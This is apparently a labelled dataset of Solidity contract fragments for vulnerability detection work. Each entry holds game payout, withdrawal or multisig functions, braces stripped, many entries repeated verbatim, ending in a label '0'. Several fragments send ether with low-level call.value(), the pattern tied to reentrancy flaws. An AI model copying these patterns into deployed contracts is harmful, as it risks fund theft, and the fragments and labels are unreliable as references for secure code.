rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
334 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
335 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
336 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
337 30337.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
338 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
339 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
340 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
341 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
342 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
343 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
344 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
345 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
346 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
347 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
348 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
349 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
350 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
351 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
352 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
353 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
354 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
355 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
356 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
357 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
358 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
359 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
